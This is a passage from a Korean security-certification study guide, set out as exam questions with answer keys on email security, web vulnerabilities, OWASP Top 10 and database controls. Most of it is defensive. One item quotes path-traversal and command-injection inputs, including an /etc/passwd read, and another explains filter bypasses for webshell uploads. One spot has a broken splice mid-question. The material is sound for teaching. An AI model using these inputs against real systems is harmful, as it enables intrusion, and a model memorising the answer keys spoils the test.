2) 네트워크 장비로부터 정보를 수집 및 관리하며 장치의 동작을 변경하는 데 사용되는 인터넷 표준 프로토콜: <strong>( B )</strong></summary>
<blockquote>
<strong>정답:</strong> (A) <strong>syslog</strong>, (B) <strong>SNMP</strong>
</blockquote>
</details>

<details>
<summary>[462] (단답형) 다음 이메일 관련 위협에 대한 설명이다. 빈칸을 채우시오.<br>
( A ): 특정인이나 시스템을 대상으로 엄청난 양의 전자우편을 일시에 보내 시스템에 고갈을 일으키는 기술이다.<br>
( B ): 발신자와 수신자가 관계없이 일방적으로 대량 전송되는 전자우편으로 정크메일이라고도 불린다.</summary>
<blockquote>
<strong>정답:</strong> (A) <strong>폭탄메일 (Mail Bomb)</strong>, (B) <strong>스팸메일 (Spam Mail)</strong>
</blockquote>
</details>

### 이메일 보안(Email Security)

<details>
<summary>(기출 25회 6번 문제) (단답형/작업형) 외부망에서 내부 메일 서버를 경유하여 다시 외부망으로 메일을 전송하는 '메일 릴레이(Relay)' 기능을 설정하고자 할 때 사용하는 옵션의 명칭과 그 의미를 쓰시오.
<div style="border: 1px solid #777; padding: 10px; margin-top: 10px; border-radius: 5px;">
1. 허용할 때 사용하는 지시어: <code>( A )</code><br>
2. 차단할 때 사용하는 지시어: <code>( B )</code> (또는 REJECT, ERROR)
</div>
</summary>
<blockquote>
(A) <strong>RELAY</strong><br>
(B) <strong>DISCARD</strong> (또는 REJECT, ERROR)
</blockquote>
</details>


<details>
<summary>[463] (단답형) 이메일 시스템을 구성하는 다음 요소들의 명칭을 쓰시오.<br>
1) 사용자가 메일을 작성하거나 수신된 메일을 읽는 프로그램(예: 아웃룩): <strong>( A )</strong><br>
2) 메일 서버 간에 메일을 전송하거나 클라이언트로부터 메일을 수신하는 서버: <strong>( B )</strong><br>
3) 수신된 메일을 사용자의 편지함(Mailbox)에 저장해주는 모듈: <strong>( C )</strong></summary>
<blockquote>
<strong>정답:</strong> (A) <strong>MUA</strong> (Mail User Agent), (B) <strong>MTA</strong> (Mail Transfer Agent), (C) <strong>MDA</strong> (Mail Delivery Agent)
</blockquote>
</details>

<details>
<summary>[464] (단답형) 다음 인터넷 메일의 처리 과정을 설명한 것이다. 빈칸을 채우시오.<br>
1) 사용자가 메일을 전송할 때 사용하는 프로토콜: <strong>( A )</strong><br>
2) 메일 서버(MTA) 간에 메일을 전달할 때 사용하는 프로토콜: <strong>( B )</strong><br>
3) 사용자가 메일 박스에서 메일을 읽어올 때 사용하는 프로토콜: <strong>( C )</strong></summary>
<blockquote>
<strong>정답:</strong> (A) <strong>SMTP</strong>, (B) <strong>SMTP</strong>, (C) <strong>POP3 또는 IMAP</strong>
</blockquote>
</details>

<details>
<summary>[465] (단답형/서술형) 다음 이메일 관련 프로토콜(SMTP, POP3, IMAP)에 대한 설명이다. 빈칸을 채우시오.<br>
( A ): 이메일을 발송할 때 사용하며 25/tcp 포트를 사용한다.<br>
( B ): 서버로부터 메일을 다운로드하며 조회 후 서버에서 삭제하는 방식이고 110/tcp 포트를 사용한다.<br>
( C ): 서버의 메시지를 읽어오며 서버에 유지하여 동기화하는 방식이고 143/tcp 포트를 사용한다.</summary>
<blockquote>
<strong>정답:</strong> (A) <strong>SMTP</strong>, (B) <strong>POP3</strong>, (C) <strong>IMAP</strong>
</blockquote>
</details>

<details>
<summary>[466] (단답형) 보안 이메일 프로토콜의 표준 포트 번호를 각각 쓰시오.<br>
1) SMTPS: <strong>( A )</strong><br>
2) POP3S: <strong>( B )</strong><br>
3) IMAPS: <strong>( C )</strong></summary>
<blockquote>
<strong>정답:</strong> (A) <strong>465번</strong>, (B) <strong>995번</strong>, (C) <strong>993번</strong>
</blockquote>
</details>

<details>
<summary>[467] (단답형) 메일 서버 외부에서 메일 서버를 경유하여 다른 메일 서버로 메일을 발송하는 기능을 무엇이라 하는가? 인증 없이 모든 곳에 허용될 경우 스팸 발송지로 악용될 수 있다.</summary>
<blockquote>
<strong>정답:</strong> <strong>메일 릴레이(RELAY)</strong> 기능
</blockquote>
</details>

<details>
<summary>[468] (작업형) Sendmail의 <code>access</code> 파일 설정에서 다음 빈칸에 들어갈 처리 방식을 쓰시오.<br>
1) 지정된 대상의 메일 릴레이를 허용한다: <strong>( A )</strong><br>
2) 메일 수신을 거부하고 거부 메시지를 발신자에게 보낸다: <strong>( B )</strong><br>
3) 메일을 폐기하고 발신자에게는 성공적으로 보낸 것처럼 속인다: <strong>( C )</strong></summary>
<blockquote>
<strong>정답:</strong> (A) <strong>RELAY</strong>, (B) <strong>REJECT</strong>, (C) <strong>DISCARD</strong>
</blockquote>
</details>

<details>
<summary>[469] (작업형) Sendmail에서 스팸 릴레이 차단 정책(access)을 설정한 후 이를 DB 파일(access.db)로 변환하는 명령어를 쓰시오.<br>
<code><strong>( A )</strong> <strong>( B )</strong> /etc/mail/access.db < /etc/mail/access</code></summary>
<blockquote>
<strong>정답:</strong> (A) <strong>makemap</strong>, (B) <strong>hash</strong>
</blockquote>
</details>

<details>
<summary>[470] (단답형) Sendmail(8.9 이상)에서 릴레이 제한 및 스팸 차단 정책을 관리하는 텍스트 파일의 경로와 이름을 쓰시오.</summary>
<blockquote>
<strong>정답:</strong> <code>/etc/mail/access</code>
</blockquote>
</details>

<details>
<summary>[471] (단답형/서술형) 필 지머먼이 개발한 이메일 보안 프로토콜인 **PGP**가 제공하는 주요 보안 기능 4가지를 쓰시오.</summary>
<blockquote>
<strong>정답:</strong> <strong>기밀성</strong>(대칭키 암호화), <strong>인증 및 무결성</strong>(디지털 서명), <strong>압축</strong>(ZIP), <strong>단편화 및 조립</strong> (또는 이메일 호환성 Radix-64)
</blockquote>
</details>

<details>
<summary>[472] (단답형) PGP에서 8비트 데이터를 7비트 ASCII 문자열로 변환하여 메일 시스템 간의 호환성을 유지해주는 인코딩 방식의 명칭은 무엇인가?</summary>
<blockquote>
<strong>정답:</strong> <strong>Radix-64</strong> (Base64 계열)
</blockquote>
</details>

<details>
<summary>[473] (단답형) 이메일 발송 경로(IP)를 분석하고 실제 발송 서버를 역추적하기 위해 확인해야 하는 헤더는 무엇인가?</summary>
<blockquote>
<strong>정답:</strong> <strong>Received</strong> 헤더
</blockquote>
</details>

<details>
<summary>[474] (서술형) 다음 이메일 보안 도구들의 특징을 간단히 쓰시오.<br>
1) <strong>SpamAssassin</strong>: <strong>( A )</strong><br>
2) <strong>Procmail</strong>: <strong>( B )</strong></summary>
<blockquote>
<strong>정답:</strong><br>
- (A) <strong>SpamAssassin</strong>: 규칙 기반 및 블랙리스트 등을 분석하여 스팸 점수를 매겨 필터링한다.<br>
- (B) <strong>Procmail</strong>: 사용자별 필터링 규칙(forward 등)을 통해 메일을 자동 분류하거나 처리한다.
</blockquote>
</details>

### 웹 보안 및 OWASP Top 10

<details>
<summary>[기출 21회 6번 문제] (단답형) 불완전한 암호화 저장 취약점 점검 방법에 관하여 ( )에 들어갈 용어를 설명하시오.<br>
1. DB에 저장된 중요정보가 (A)로 열람 가능한지 확인한다.<br>
2. (B) 또는 암호화된 쿠키값이 명백하게 랜덤으로 생성되는지 확인한다.<br>
3. 적절한 (C)이 제대로 적용되었는지 검증한다.</summary>
<blockquote>
<strong>정답:</strong> (A) <strong>평문 (Plaintext) 또는 SQL Query</strong>, (B) <strong>세션 ID (Session ID)</strong>, (C) <strong>암호화 알고리즘</strong>
</blockquote>
</details>

<details>
<summary>(기출 23회 13번 문제) (서술형) PHP 게시판 소스코드에서 파일 업로드 시 확장자를 화이트리스트 방식으로 검증하지만, Content-Type 헤더를 image/jpeg로 조작하거나 대소문자 혼용(test.pHp) 등을 통해 필터링을 우회하여 <strong>웹쉘(WebShell)</strong>을 업로드하는 공격이 가능하다. 이때 공격이 성공하기 위한 서버 측 설정 조건(httpd.conf 등)을 3가지 서술하시오.</summary>
<blockquote>
1. <code>AllowOverride None</code> 설정이 되어 있지 않아 <code>.htaccess</code> 파일로 설정을 덮어쓸 수 있는 경우<br>
2. <code>FilesMatch</code> 지시어에서 특정 확장자에 대한 실행 제한이 미비한 경우<br>
3. <code>AddType</code> 또는 <code>AddHandler</code> 지시어를 통해 변조된 확장자가 스크립트 엔진에 의해 실행되도록 설정된 경우
</blockquote>
</details>

<details>
<summary>[484] (단답형) 공격자가 웹 서버의 파일 업로드 취약점을 이용하여 <strong>WebShell</strong>과 같은 악성 스크립트 파일(asp, jsp, php 등)을 업로드한 뒤, 이를 실행하여 서버의 제어권을 탈취하는 공격의 명칭을 쓰시오.</summary>
<blockquote>
<strong>정답:</strong> <strong>파일 업로드(File Upload)</strong> 취약점 공격
</blockquote>
</details>

<details>
<summary>[504] (작업형) **XSS(Cross Site Scripting)**의 두 가지 주요 유형에 대해 빈칸을 채우시오.<br>
1) 악성 스크립트가 포함된 게시물을 서버의 DB 등에 영구적으로 저장하여, 사용자가 해당 게시물을 읽을 때마다 스크립트가 실행되는 방식: <strong>( A )</strong><br>
2) 악성 스크립트가 포함된 링크를 사용자가 클릭하게 유도하여, 서버가 해당 스크립트를 포함한 응답을 사용자에게 즉시 반사(Reflect)하며 실행되는 방식: <strong>( B )</strong></summary>
<blockquote>
<strong>정답:</strong> (A) <strong>Stored(저장형) XSS</strong>, (B) <strong>Reflected(반사형) XSS</strong>
</blockquote>
</details>

<details>
<summary>[476] (서술형) **CSRF(Cross-Site Request Forgery)** 공격을 방어하기 위한 주요 기술적 대책 3가지를 설명하시오.</summary>
<blockquote>
<strong>정답:</strong><br>
1) <strong>CSRF 토큰 사용</strong>: 모든 요청에 대해 매번 변경되는 난수 형태의 토큰을 발행하고, 서버에서 이를 검증한 후 요청을 처리한다.<br>
2) <strong>HTTP Method 제한</strong>: 데이터 변경이 발생하는 요청은 GET 방식이 아닌 <strong>POST</strong> 방식을 사용하도록 제한한다.<br>
3) <strong>재인증 요구</strong>: 송금, 비빌번호 변경 등 중요한 기능 실행 시 비밀번호 재입력이나 2차 인증(OTP 등)을 요구한다.
</blockquote>
</details>

<details>
<summary>[492] (분석/단답형) 다음 공격 로그를 분석하여 각각 어떤 공격 유형에 해당하는지 쓰시오.<br>
1) <code>?file=passwd&path=../../../../etc/passwd</code>: <strong>( A )</strong><br>
2) <code>?name=admin&cmd=ls -al</code>: <strong>( B )</strong></summary>
<blockquote>
<strong>정답:</strong> (A) <strong>Path Traversal</strong> (또는 Directory Traversal / 파일 다운로드), (B) <strong>OS Command Injection</strong> (운영체제 명령어 삽입)
</blockquote>
</details>

<details>
<summary>[484] (단답형) 공격자가 웹 서버에 업로드하여 원격으로 시스템 명령어를 실행하거나 파일을 관리할 수 있게 해주는 악성 스크립트(asp, jsp, php 등)를 무엇이라 하는지 쓰시오.</summary>
<blockquote>
<strong>정답:</strong> <strong>웹쉘(WebShell)</strong>
</blockquote>
</details>

<details>
<summary>[492] (작업형) PHP 기반 웹 애플리케이션에서 **RFI(Remote File Inclusion)** 공격을 방지하기 위한 설정 파일과 항목값을 쓰시오.<br>
1) 설정 파일: <strong>( A )</strong><br>
2) 설정 항목: <code>allow_url_fopen</code> = <strong>( B )</strong></summary>
<blockquote>
<strong>정답:</strong> (A) <code>php.ini</code>, (B) <code>Off</code>
</blockquote>
</details>

<details>
<summary>[508] (분석/단답형) 공격자가 HTTP 요청 메시지에 줄바꿈 문자를 삽입하여 서버의 응답 헤더를 조작하거나 2개의 응답을 만들어 내어 XSS 등을 유도하는 공격의 명칭과, 이때 사용되는 줄바꿈 제어문자의 명칭(또는 URL 인코딩 값)을 쓰시오.<br>
1) 공격명: <strong>( A )</strong><br>
2) 제어문자 1: <strong>( B )</strong><br>
3) 제어문자 2: <strong>( C )</strong></summary>
<blockquote>
<strong>정답:</strong> (A) <strong>HTTP 응답 분할(HTTP Response Splitting)</strong>, (B) <strong>CR</strong> (Carriage Return, %0D), (C) <strong>LF</strong> (Line Feed, %0A)
</blockquote>
</details>

<details>
<summary>[기출 13회 5번 문제] (단답형) HTTP 헤더 인젝션 공격 시 사용되는 개행문자(줄바꿈 문자) 두 가지의 약어를 쓰시오.</summary>
<blockquote>
<strong>정답:</strong> <strong>CR</strong> (\r, Carriage Return), <strong>LF</strong> (\n, Line Feed)<br>
<strong>해석:</strong> HTTP 프로토콜에서 헤더 구분을 위해 사용하는 제어 문자를 악용하여 서버의 응답을 조작하는 공격이다.
</blockquote>
</details>

<details>
<summary>[491] (단답형) 모바일 웹이나 앱에서 특정 페이지로 직접 이동하기 위해 사용하는 링크 기술로, 적절한 검증이 없을 경우 권한 없는 동작이 실행될 수 있는 취약점을 무엇이라 하는지 쓰시오.</summary>
<blockquote>
<strong>정답:</strong> <strong>딥링크(Deeplink)</strong> 취약점
</blockquote>
</details>

<details>
<summary>[기출 13회 12번 문제] (단답형) 모바일 앱에서 악성 링크를 통해 특정 위치로 직접 이동시키는 공격에 악용 가능한 기술로, 앱 내부의 특정 지점으로 유도하는 링크 기술의 명칭을 쓰시오.</summary>
<blockquote>
<strong>정답:</strong> <strong>딥링크 (DeepLink)</strong><br>
<strong>해설:</strong> 안드로이드나 iOS 앱에서 특정 페이지나 기능으로 바로 이동할 수 있게 해주는 URL 스키마 기술로, 공격자가 이를 변조하여 피싱이나 무단 기능 실행에 악용할 수 있음.
</blockquote>
</details>

<details>
<summary>[505] (작업형) Apache 웹 서버에서 브라우저를 통해 디렉토리 내의 파일 목록이 노출되는 **디렉토리 리스팅(Directory Listing)** 취약점을 방지하기 위해 <code>httpd.conf</code> 파일의 <code>Options</code> 지시자에서 제거해야 할 옵션 명칭을 쓰시오.</summary>
<blockquote>
<strong>정답:</strong> <strong>Indexes</strong> (또는 <code>-Indexes</code>로 설정)
</blockquote>
</details>

<details>
<summary>[506] (작업형) Apache 웹 서버에서 업로드 파일 크기를 제한하여 서비스 거부 공격(DoS) 등을 예방하고자 할 때 사용하는 지시자를 쓰시오.(예: 5MB로 제한 시 <code>( A ) 5000000</code>)</summary>
<blockquote>
<strong>정답:</strong> <strong>LimitRequestBody</strong>
</blockquote>
</details>

<details>
<summary>[510] (단답형) 웹 사이트의 루트 디렉토리에 위치하며, 검색엔진의 크롤링 로봇이 접근할 수 있는 범위를 지정하여 중요한 정보가 검색 결과에 노출되지 않도록 설정하는 파일의 명칭을 쓰시오.</summary>
<blockquote>
<strong>정답:</strong> <strong>robots.txt</strong>
</blockquote>
</details>

<details>
<summary>[기출 24회 6번 문제] (단답형) 웹 크롤러의 접근 제어를 위한 국제 표준으로, 민감한 디렉토리나 관리자 페이지에 대한 크롤링을 제한하여 보안을 강화하는 파일의 명칭을 쓰시오.</summary>
<blockquote>
<strong>정답:</strong> <strong>robots.txt</strong><br>
<strong>해설:</strong> robots.txt를 통해 검색 엔진 최적화(SEO)와 웹사이트 보안을 동시에 관리할 수 있습니다.
</blockquote>
</details>

<details>
<summary>[509] (작업형) Apache 웹 서버의 배너 정보를 최소화하여 공격자에게 불필요한 OS 및 모듈 정보를 노출하지 않도록 설정할 때, <code>ServerTokens</code> 지시자에 권장되는 설정값을 쓰시오.</summary>
<blockquote>
<strong>정답:</strong> <strong>Prod</strong> (또는 ProductOnly)
</blockquote>
</details>

<details>
<summary>[520] (분석/작업형) 다음 Apache **access_log**의 각 필드가 의미하는 바를 쓰시오.<br>
<code>200.100.50.25 - - [13/Sep/2023:11:00:00 +0900] "GET /index.php HTTP/1.1" 200 234 "http://www.algisa.com/a.asp" "Mozilla/5.0..."</code><br>
1) <code>"GET /index.php HTTP/1.1"</code>: <strong>( A )</strong><br>
2) <code>200</code>: <strong>( B )</strong><br>
3) <code>"http://www.algisa.com/a.asp"</code>: <strong>( C )</strong></summary>
<blockquote>
<strong>정답:</strong> (A) <strong>요청 라인(Request Line)</strong>, (B) <strong>상태 코드(Status Code)</strong>, (C) <strong>Referer</strong> (이전 페이지 정보)
</blockquote>
</details>

<details>
<summary>[기출 24회 10번 문제] (단답형) 아파치 웹 서버의 로그 분석 시 확인할 수 있는 정보 중 다음 설명에 해당하는 요소를 쓰시오.<br>
(1) 클라이언트의 의도(메소드, URI)를 파악할 수 있는 부분<br>
(2) 서버의 응답 상태를 나타내는 정보<br>
(3) 트래픽의 출처를 추적할 수 있는 정보</summary>
<blockquote>
<strong>정답:</strong> (1): <strong>요청라인 (Request Line)</strong>, (2): <strong>상태코드 (Status Code)</strong>, (3): <strong>Referer 정보</strong><br>
<strong>해설:</strong> 아파치 로그 분석은 보안 모니터링과 사고 대응에 핵심적인 역할을 합니다.
</blockquote>
</details>

<details>
<summary>[524] (작업형) **컴퓨터 범죄(Cyber Crime)**의 주요 수법에 대한 설명으로 빈칸을 채우시오.<br>
1) 원시 데이터(Source Data)를 입력할 때 고의로 위·변조하거나 다른 데이터로 바꾸어 넣는 수법: <strong>( A )</strong><br>
2) 이자 계산 등에서 발생하는 소수점 이하의 단수(端數)를 특정 계좌로 조금씩 모아 거액을 횡령하는 수법: <strong>( B )</strong><br>
3) 정상적인 통신 채널에 기생하여 보이지 않게 메시지를 숨겨서 전달하는 은닉 통로: <strong>( C )</strong></summary>
<blockquote>
<strong>정답:</strong> (A) <strong>데이터 디들링(Data Diddling)</strong>, (B) <strong>살라미(Salami)</strong> 기법, (C) <strong>은닉 채널(Covert Channel)</strong>
</blockquote>
</details>

<details>
<summary>[530] (단답형) 특정 날짜나 시간, 혹은 특정 조건이 충족될 때 악의적인 기능을 수행하도록 프로그램 내에 삽입된 코드를 무엇이라 하는지 쓰시오.</summary>
<blockquote>
<strong>정답:</strong> <strong>논리 폭탄(Logic Bomb)</strong>
</blockquote>
</details>

<details>
<summary>[기출 24회 2번 문제] (단답형) 다음 데이터베이스 암호화 방식에 해당하는 용어를 각각 쓰시오.<br>
(A) 애플리케이션 레벨에서 유연한 구현이 가능하나 성능 오버헤드가 있을 수 있는 방식<br>
(B) DBMS와 독립적으로 운영되며 확장성이 좋은 방식<br>
(C) DBMS 엔진 레벨에서 동작하여 애플리케이션 수정 없이 투명한 암호화를 제공하는 방식</summary>
<blockquote>
<strong>정답:</strong> (A): <strong>API 방식</strong>, (B): <strong>Plug-In 방식</strong>, (C): <strong>TDE (Transparent Data Encryption)</strong><br>
<strong>해설:</strong> 데이터베이스 암호화는 구현 방식에 따라 다양한 장단점이 있습니다. API 방식은 애플리케이션 레벨에서, Plug-In 방식은 DBMS 외부 모듈로, TDE는 DBMS 엔진 내부에서 동작합니다.
</blockquote>
</details>

<details>
<summary>[538] (작업형) **데이터베이스(DB) 보안** 위협 모델에 대한 설명으로 빈칸을 채우시오.<br>
1) 낮은 보안 등급의 정보들을 조각별로 조합하여 높은 등급의 정보를 알아내는 방식: <strong>( A )</strong><br>
2) 보안 등급이 없는 사용자가 기밀 정보에 대해 직접 접근하지 않고, 일반적인 질의를 통해 연역적으로 기밀 정보를 추턴해 내는 행위: <strong>( B )</strong></summary>
<blockquote>
<strong>정답:</strong> (A) <strong>집성(Aggregation)</strong>, (B) <strong>추론(Inference)</strong>
</blockquote>
</details>

<details>
<summary>[기출 12회 4번 문제] (단답형) 데이터베이스의 보안 위협과 관련된 다음 설명이 의미하는 용어를 각각 쓰시오.
1) 낮은 보안 등급의 정보 조각들을 조합하여 민감한 정보를 알아내는 기법: <strong>( A )</strong><br>
2) 일반적인 데이터에 접근하여 통계적인 분석 등을 통해 기밀 정보를 유추해내는 공격: <strong>( B )</strong><br>
3) 데이터를 입력하거나 출력하는 과정에서 원본 데이터를 교묘하게 수정하여 결과를 조작하는 행위: <strong>( C )</strong>
</summary>
<blockquote>
<strong>정답:</strong><br>
(A) <strong>집성 (Aggregation)</strong><br>
(B) <strong>추론 (Inference)</strong><br>
(C) <strong>데이터 디들링 (Data Diddling)</strong>
</blockquote>
</details>

<details>
<summary>[기출 13회 17번 문제] (서술형) Oracle DBMS의 접근 권한 설정 미흡과 관련하여 다음 물음에 답하시오.
1) 일반 사용자에게 과도한 권한(예: DBA 권한 등)이 부여되었을 때 발생할 수 있는 보안 문제점은?<br>
2) 중요 데이터에 대해 'AUDIT' 설정을 누락했을 때의 문제점은?<br>
3) 롤(Role)을 사용하여 일반 사용자에게 최소한의 조회 권한만 부여하는 SQL 예시를 작성하시오.
</summary>
<blockquote>
<strong>정답:</strong><br>
1) <strong>권한 남용:</strong> 권한 오남용을 통해 중요 데이터 유출 및 무단 변경(변조, 삭제) 가능성 증대<br>
2) <strong>책임 추적성 결여:</strong> 중요 데이터 접근 및 행위 기록이 없어 침해 사고 발생 시 원인 규명 및 책임소재 파악 불가<br>
3) <strong>SQL 예시:</strong><br>
<code>CREATE ROLE ROLE_NAME;</code><br>
<code>GRANT SELECT ON TABLE_NAME TO ROLE_NAME;</code><br>
<code>GRANT ROLE_NAME TO USERNAME;</code>
</blockquote>
</details>

<details>
<summary>[541] (서술형) 데이터베이스 보안 통제 방법 중 **접근 통제(Access Control)**와 **흐름 통제(Flow Control)**의 차이점을 설명하시오.</summary>
<blockquote>
<strong>정답:</strong><br>
- <strong>접근 통제</strong>: 사용자의 권한에 따라 데이터베이스 내의 특정 데이터 객체(테이블, 뷰 등)에 대한 접근 여부를 제어한다.<br>
- <strong>흐름 통제</strong>: 데이터가 보안 등급이 높은 객체에서 낮은 객체로 흐르는 것을 방지하여 정보 노출을 차단한다.
</blockquote>
</details>

<details>
<summary>[540] (작업형) 데이터베이스 권한 관리를 위한 **DCL(Data Control Language)**에 대한 설명으로 빈칸을 채우시오.<br>
1) 사용자에게 객체에 대한 권한을 부여하는 명령어: <strong>( A )</strong><br>
2) 기 부여된 권한을 회수 및 해제하는 명령어: <strong>( B )</strong><br>
3) 부여된 권한과 중복될 경우 우선권을 가지며 권한을 명시적으로 금지하는 명령어: <strong>( C )</strong></summary>
<blockquote>
<strong>정답:</strong> (A) <strong>GRANT</strong>, (B) <strong>REVOKE</strong>, (C) <strong>DENY</strong>
</blockquote>
</details>

<details>
<summary>[548] (서술형) **MySQL** 데이터베이스를 Linux 환경에서 운영할 때, 외부 네트워크의 접근을 차단하고 로컬 설치 앱에서만 접근할 수 있도록 <code>my.cnf</code> 파일에 설정해야 하는 옵션 명칭을 쓰시오.</summary>
<blockquote>
<strong>정답:</strong> <strong>skip-networking</strong> (<code>[mysqld]</code> 섹션에 추가)
</blockquote>
</details>

<details>
<summary>[549] (단답형) MySQL에서 서비스를 중단하지 않고 데이터베이스를 백업할 수 있는 커맨드라인 도구의 명칭을 쓰시오.</summary>
<blockquote>
<strong>정답:</strong> <strong>mysqldump</strong>
</blockquote>
</details>

<details>
<summary>[542] (작업형) **데이터베이스 암호화 방식** 에 대한 설명으로 빈칸을 채우시오.<br>
1) 애플리케이션 수정이 필요 없으며, DB 서버에 암호화 모듈을 설치하여 처리하는 방식: <strong>( A )</strong><br>
2) 애플리케이션 레벨에서 암호화 API를 호출하여 처리하며, DBMS 부하를 줄일 수 있는 방식: <strong>( B )</strong><br>
3) DBMS에 내장된 기능을 사용하여 스토리지 저장 시 자동으로 암호화하는 방식: <strong>( C )</strong></summary>
<blockquote>
<strong>정답:</strong> (A) <strong>Plug-In 방식</strong>, (B) <strong>API 방식</strong>, (C) <strong>TDE (Transparent Data Encryption) 방식</strong>
</blockquote>
</details>

<details>
<summary>[543] (단답형) **SET(Secure Electronic Transaction)** 프로토콜에서 상점은 고객의 결제 정보를 볼 수 없고, 금융기관은 고객의 주문 내용을 볼 수 없도록 하여 개인정보를 보호하는 핵심 기술 명칭을 쓰시오.</summary>
<blockquote>
<strong>정답:</strong> <strong>이중 서명(Dual Signature)</strong>
</blockquote>
</details>

<details>
<summary>[547] (단답형) 제3자 프로그램이 리소스 소유자를 대신하여 리소스 서버의 자원에 제한적으로 접근할 수 있도록 권한을 위임하는 개방형 표준 프로토콜에서, 일정 기간 접근 권한을 증명하는 문자열을 무엇이라 하는지 쓰시오.</summary>
<blockquote>
정답: <strong>액세스 토큰(Access Token)</strong> (프로토콜: OAuth 2.0)
</blockquote>
</details>

<details>
<summary>[421] (분석/작업형) 다음은 윈도우 PC 점검 결과이다. 질문에 답하시오.<br>
<code>C:\> ipconfig /displaydns</code><br>
<code>Record Name: www.naver.com</code><br>
<code>Record Type: 1</code><br>
<code>A(host) Record: 172.16.3.200</code><br>
(* 실제 <code>www.naver.com</code> 주소는 <code>223.130.195.95</code>임)<br>
1) 의심되는 공격 명칭을 쓰시오.<br>
2) 이 공격에 대응하기 위해 중요한 사이트의 IP를 우선적으로 조회하게 할 수 있는 로컬 파일 경로를 쓰시오.</summary>
<blockquote>
<strong>정답:</strong> 1) <strong>DNS 스푸핑(Spoofing)</strong>, 2) <strong>C:\Windows\System32\drivers\etc\hosts</strong> (hosts 파일)
</blockquote>
</details>

<details>
<summary>[549] (단답형) OWASP Top 10:2021에서 새롭게 1위로 선정되었으며, 사용자의 권한을 부적절하게 검증하여 허가되지 않은 데이터나 기능에 접근할 수 있게 되는 취약점의 명칭을 영문으로 쓰시오.</summary>
<blockquote>
<code>Broken Access Control</code> (취약한 접근 통제)
</blockquote>
</details>

<details>
<summary>[550] (단답형) OWASP Top 10:2021에서 새롭게 추가된 취약점 중 하나로, 공격자가 조작된 요청을 보내 서버 내부의 자원이나 외부 시스템과 통신하게 만듦으로써 정보 유출이나 내부 시스템 침투를 유도하는 공격의 영문 약어를 쓰시오.</summary>
<blockquote>
<code>SSRF</code> (Server-Side Request Forgery)
</blockquote>
</details>

<details>
<summary>[551] (서술형) OWASP Top 10:2021에서 기존의 'Sensitive Data Exposure'에서 명칭이 변경되며 범주가 확장된 취약점의 명칭(A)과, 이를 방어하기 위해 데이터 전송 시 필수적으로 적용해야 하는 암호화 프로토콜(B)을 쓰시오.</summary>
<blockquote>
(A) <code>Cryptographic Failures</code> (암호화 결함)<br>
(B) <code>TLS</code> (Transport Layer Security) 1.2 이상
</blockquote>
</details>

<details>
<summary>[552] (서술형) OWASP Top 10:2021에서 새롭게 정의된 <strong>Insecure Design</strong>(안전하지 않은 설계)의 특징을 구현 단계의 취약점과 비교하여 서술하고, 이를 예방하기 위해 설계 단계에서 수행해야 할 보안 활동을 1가지 제시하시오.</summary>
<blockquote>
<strong>특징</strong>: 소스코드 상의 구현 실수(Coding Error)보다는 비즈니스 로직이나 시스템 아키텍처 자체의 보안 고려사항이 누락되어 발생하는 근본적인 취약점을 의미한다.<br>
<strong>보안 활동</strong>: <code>위협 모델링 (Threat Modeling)</code>을 통해 설계 단계에서 잠재적인 보안 위험을 사전에 분석하고 완화 대책을 마련해야 한다.
</blockquote>
</details>

<details>
<summary>[553] (단답형) OWASP Top 10:2021의 A08 항목인 <strong>Software and Data Integrity Failures</strong>(소프트웨어 및 데이터 무결성 결함)에 포함되며, 신뢰할 수 없는 데이터로부터 객체를 복원할 때 악성 코드가 실행될 수 있는 취약점의 영문 명칭을 쓰시오.</summary>
<blockquote>
<code>Insecure Deserialization</code> (안전하지 않은 역직렬화)
</blockquote>
</details>

<details>
<summary>[554] (작업형) 다음 빈칸 (A), (B)에 들어갈 알맞은 취약점 항목을 OWASP Top 10:2021 기준으로 작성하시오.<br>
<div style="border: 1px solid #777; padding: 10px; margin-top: 10px; border-radius: 5px;">
<strong>[상황 및 점검 항목]</strong><br>
- (A) 항목: 웹 서버 및 데이터베이스 서버의 기본 계정 미변경, 불필요한 서비스 활성화, 디렉터리 리스팅 허용 등 설정 상의 허점으로 인해 발생하는 취약점이다.<br>
- (B) 항목: 보안 이벤트에 대한 로그를 남기지 않거나, 이상 징후를 실시간으로 감지하지 못해 공격자의 침투를 적시에 인지하지 못하게 되는 취약점이다.
</div>
</summary>
<blockquote>
(A) <code>Security Misconfiguration</code> (보안 설정 오류)<br>
(B) <code>Security Logging and Monitoring Failures</code> (보안 로깅 및 모니터링 실패)
</blockquote>
</details>

<details>
<summary>[555] (응용/서술형) 프로젝트 팀에서 사용하는 오픈소스 라이브러리에 알려진 보안 취약점(CVE)이 패치되지 않은 채 그대로 사용되고 있다. 이와 관련된 OWASP Top 10:2021 취약점 항목 명칭과, 이를 관리하기 위한 자동화된 도구(SCA 등)의 활용 목적을 서술하시오.</summary>
<blockquote>
<strong>항목 명칭</strong>: <code>Vulnerable and Outdated Components</code> (취약하고 오래된 구성 요소)<br>
<strong>활용 목적</strong>: 프로젝트에서 사용하는 모든 서드파티 라이브러리의 목록(BOM)을 작성하고, 알려진 취약점 데이터베이스와 대조하여 보안 업데이트가 필요한 구성 요소를 실시간으로 파악하고 관리하기 위함이다.
</blockquote>
</details>(Passive Mode) 관점에서 설명하시오.</summary>
<blockquote>
<strong>정답:</strong><br>
- <strong>원인</strong>: 능동 모드는 서버가 클라이언트로 데이터를 전송하기 위해 역으로 접속을 시도하는데, 클라이언트 측 방화벽(또는 NAT)에서 인바운드 접속이 차단되어 데이터 채널 형성이 실패한다.<br>
- <strong>해결 방안</strong>: 클라이언트가 서버에 지정된 포트로 접속을 시도하는 수동 모드(Passive Mode)를 사용하여 방화벽 차단 문제를 해결할 수 있다.
</blockquote>
</details>

<details>
<summary>[454] (서술형) SNMP(Simple Network Management Protocol) 서비스 운영 시 보안을 강화하기 위한 대책 4가지를 제시하시오.</summary>
<blockquote>
<strong>정답:</strong><br>
1) 사용하지 않는 경우 SNMP 서비스를 비활성화한다.<br>
2) <code>public</code>, <code>private</code> 등 기본 설정된 **Community String**을 유추하기 어려운 복잡한 문자열로 변경한다.<br>
3) 인증 및 암호화 기능을 제공하는 **SNMPv3**를 사용하여 통신한다.<br>
4) 관리 시스템(NMS)의 IP를 등록하여 해당 IP에서만 SNMP 요청을 허용하도록 ACL을 설정한다.
</blockquote>
</details>

<details>
<summary>[470] (작업형) **이메일 보안 표준**에 대한 설명으로 빈칸을 채우시오.<br>
1) 발신 도메인의 DNS에 등록된 허용 IP와 실제 발신자 IP를 대조하여 위장 여부를 확인하는 기술: <strong>( A )</strong><br>
